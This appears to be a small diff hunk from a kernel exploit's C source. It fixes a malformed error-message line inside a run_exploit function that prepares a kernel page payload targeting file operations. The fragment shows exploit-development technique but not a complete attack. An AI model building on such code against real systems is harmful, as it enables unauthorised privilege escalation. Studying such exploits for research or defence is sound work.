@@ -950,7 +950,7 @@ int run_exploit(int argc, char **argv) {
         uint64_t magic = vs && vs[0] ? strtoull(vs, NULL, 0) : 0xCAFEB0000ULL;
         /* solve THIS boot's mm first (sets last_mm_struct), then fast-path */
         if (!prepare_good_kernel_page(PAGE_PAYLOAD_FOPS)) {
-          pr_error("VERIFY: mm solve failed" + B + ");
+          pr_error("VERIFY: mm solve failed\n");
           goto after_w1c;
         }
         char mmhex[32];
